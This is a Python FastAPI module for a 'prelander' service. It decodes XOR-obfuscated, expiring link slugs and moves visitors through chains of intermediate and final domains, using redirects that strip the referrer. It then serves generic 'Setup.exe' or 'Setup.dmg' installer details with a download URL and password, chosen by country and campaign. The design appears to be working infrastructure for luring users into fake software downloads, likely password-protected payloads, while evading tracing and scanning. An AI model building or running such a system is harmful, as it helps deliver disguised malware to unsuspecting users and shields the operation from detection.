"""
Prelander API — returns file details, offer URL, and password.

Endpoint: GET /prelander/resolve/{slug}
  - Decodes the XOR-encrypted slug from traffic_router.py
  - If the request host is an intermediate domain → 302 to last domain /d/{slug}
    (completing the three-step flow: anchor → intermediate → last)
  - Otherwise → returns prelander data (offer_url, password, os, etc.)

Three-step flow (bypass OFF, both intermediate + last configured):
  1. /click  →  intermediate_domain/d/{slug}       (entry point)
  2. intermediate/d/{slug} loads, calls /api/prelander/resolve/{slug}
     → backend detects intermediate host → 302 to last_domain/d/{slug}
  3. last/d/{slug} loads, calls /api/prelander/resolve/{slug}
     → backend returns prelander data → page renders template

Two-step flow (bypass OFF, only last OR only intermediate configured):
  1. /click  →  last_domain/d/{slug}
  2. last/d/{slug} calls /api/prelander/resolve/{slug} → data returned

Bypass ON (direct_redirect_mode):
  1. /click  →  campaign URL directly (no prelander at all)
"""
import logging
from fastapi import APIRouter, Query, Depends, Request
from fastapi.responses import JSONResponse, RedirectResponse
from typing import Optional
from bson import ObjectId
import base64
from app.dependencies import get_db

logger = logging.getLogger(__name__)

_XOR_KEY = "mxp2026"


def _decode_slug(slug: str) -> Optional[dict]:
    """
    Decode an XOR-encrypted slug → {os, timestamp, offer_id, campaign_id, country_code}.
    Returns None if invalid or if the timestamp is older than 1 hour (expired).
    """
    try:
        padded = slug + "=" * (4 - len(slug) % 4) if len(slug) % 4 else slug
        xored = base64.urlsafe_b64decode(padded)
        raw = "".join(chr(b ^ ord(_XOR_KEY[i % len(_XOR_KEY)])) for i, b in enumerate(xored))
        if ":" not in raw:
            return None
        parts = raw.split(":")
        result = {"os": parts[0]}

        # parts[1] is the timestamp — validate expiry (3600s = 1 hour)
        if len(parts) >= 2 and parts[1]:
            try:
                import time
                slug_ts = int(parts[1])
                age = time.time() - slug_ts
                if age > 3600:  # 1 hour expiry
                    logger.warning("[PRELANDER] Slug expired (age=%ds)", int(age))
                    return None
                if age < -60:   # Clock skew guard — reject future timestamps
                    logger.warning("[PRELANDER] Slug from the future, rejected")
                    return None
            except (ValueError, TypeError):
                return None

        if len(parts) >= 3 and parts[2]:
            result["offer_id"] = parts[2]
        if len(parts) >= 4 and parts[3]:
            result["campaign_id"] = parts[3]
        if len(parts) >= 5 and parts[4]:
            result["country_code"] = parts[4]
        return result
    except Exception:
        return None


router = APIRouter(prefix="/prelander", tags=["Prelander"])


@router.get("/resolve/{slug}")
async def resolve_slug(slug: str, request: Request, db=Depends(get_db)):
    """
    Main prelander resolver. Called by the /d/[slug] Next.js page.

    When the requesting host is an intermediate domain:
      → 302 redirect to {last_domain}/d/{slug}  (completes the intermediate hop)

    When the requesting host is a last domain or any other host:
      → Returns prelander data JSON (offer_url, password, os, etc.)
    """
    from app.services.domain_service import normalize_domain, resolve_domain_url

    # The /api/ proxy strips the original Host header. The frontend sends the
    # real browser hostname via X-Prelander-Host so we can detect domain type.
    prelander_host = (
        request.headers.get("x-prelander-host", "")
        or request.headers.get("host", "")
    ).split(":")[0].lower()
    host_normalized = normalize_domain(prelander_host)

    # ── Intermediate domain detection ─────────────────────────────────────────
    if host_normalized:
        inter_doc = await db.redirection_domains.find_one({
            "domain": host_normalized,
            "domain_type": "intermediate",
            "status": "active",
        })
        if inter_doc:
            publisher_ids = inter_doc.get("publisher_ids") or []
            publisher_id = publisher_ids[0] if publisher_ids else None
            last_base = await resolve_domain_url(db, "last", publisher_id)
            if last_base:
                dest = f"{last_base.rstrip('/')}/d/{slug}"
                logger.info("[PRELANDER] Intermediate hop %s → %s", host_normalized, dest)
                return RedirectResponse(
                    url=dest,
                    status_code=302,
                    headers={"Referrer-Policy": "no-referrer"},
                )
            # No last domain configured — fall through and serve data directly

    # ── Normal resolve ─────────────────────────────────────────────────────────
    decoded = _decode_slug(slug)
    if not decoded:
        return JSONResponse(status_code=404, content={"detail": "Not found"})

    return await _get_prelander_data(
        request, decoded["os"], db,
        offer_id=decoded.get("offer_id"),
        campaign_id=decoded.get("campaign_id"),
        country_code=decoded.get("country_code"),
    )


@router.get("/data")
async def get_prelander_data_legacy(
    request: Request,
    os: str = Query("windows", description="OS type: windows or mac"),
    pub: Optional[str] = Query(None, description="Publisher ID"),
    db=Depends(get_db),
):
    """Legacy endpoint — returns prelander data without a slug."""
    return await _get_prelander_data(request, os, db)


async def _get_prelander_data(
    request: Request,
    os: str,
    db,
    offer_id: Optional[str] = None,
    campaign_id: Optional[str] = None,
    country_code: Optional[str] = None,
):
    """Core prelander data resolution logic."""
    os_lower = os.lower()

    # Last-domain template override — if the host IS a last domain, use its template setting
    host = request.headers.get("host", "").split(":")[0].lower()
    if host:
        from app.services.domain_service import normalize_domain
        last_domain_doc = await db.redirection_domains.find_one({
            "domain_type": "last",
            "domain": normalize_domain(host),
            "status": "active",
        })
        if last_domain_doc:
            tpl = last_domain_doc.get("template", "default")
            if tpl == "mac":
                os_lower = "mac"
            elif tpl == "windows":
                os_lower = "windows"

    # Per-OS file metadata
    if os_lower == "mac":
        file_name, file_ext, file_size = "Setup", ".dmg", "4.2 MB"
        file_version, file_description = "1.0.0", "macOS Application Installer"
    else:
        file_name, file_ext, file_size = "Setup", ".exe", "3.8 MB"
        file_version, file_description = "1.0.0", "Windows Application Installer"

    offer_url = None
    password = None
    campaign_name = None

    # 1. GEO rule — country-specific URL has highest priority
    if campaign_id and country_code:
        geo_rule = await db.geo_rules.find_one(
            {"campaign_id": campaign_id, "country_code": country_code},
            sort=[("priority", -1)],
        )
        if geo_rule and geo_rule.get("offer_url"):
            offer_url = geo_rule["offer_url"]
            password = geo_rule.get("password") or None

    # 2. Specific offer from slug
    if not offer_url and offer_id:
        try:
            offer = await db.offers.find_one({"_id": ObjectId(offer_id), "status": "active"})
            if offer:
                offer_url = offer.get("offer_url")
                password = offer.get("password") or None
                if offer.get("campaign_id"):
                    try:
                        camp = await db.campaigns.find_one({"_id": ObjectId(offer["campaign_id"])})
                        if camp:
                            campaign_name = camp.get("name")
                            if password is None and "password" not in offer:
                                password = camp.get("password")
                    except Exception:
                        pass
        except Exception:
            pass

    # 3. Campaign from slug
    if not campaign_name and campaign_id:
        try:
            camp = await db.campaigns.find_one({"_id": ObjectId(campaign_id)})
            if camp:
                campaign_name = camp.get("name")
                if password is None:
                    password = camp.get("password")
        except Exception:
            pass

    # 4. Fallback — match by domain, OS, or any active campaign
    if not offer_url:
        campaign = None
        req_host = request.headers.get("host", "").split(":")[0].lower()

        if req_host:
            lp = await db.landing_pages.find_one({
                "status": "active",
                "lander_url": {"$regex": req_host, "$options": "i"},
            })
            if lp and lp.get("campaign_id"):
                try:
                    campaign = await db.campaigns.find_one({"_id": ObjectId(lp["campaign_id"])})
                except Exception:
                    pass

        if not campaign:
            device_os = "windows" if os_lower == "windows" else "mac"
            campaign = await db.campaigns.find_one({
                "status": "active",
                "device_os": {"$regex": f"^{device_os}$", "$options": "i"},
            })

        if not campaign:
            campaign = await db.campaigns.find_one({
                "status": "active",
                "device_os": {"$regex": "^global$", "$options": "i"},
            })

        if not campaign:
            campaign = await db.campaigns.find_one({"status": "active"})

        if campaign:
            campaign_name = campaign.get("name")
            offer_url = (
                campaign.get("default_offer_url")
                or campaign.get("offer_url")
                or campaign.get("url")
            )
            if not password:
                password = campaign.get("password")

    if not offer_url:
        offer_url = "https://example.com"

    return {
        "success": True,
        "file_name": file_name,
        "file_ext": file_ext,
        "file_size": file_size,
        "file_version": file_version,
        "file_description": file_description,
        "offer_url": offer_url,
        "password": password,
        "campaign_name": campaign_name,
        "os": os_lower,
    }
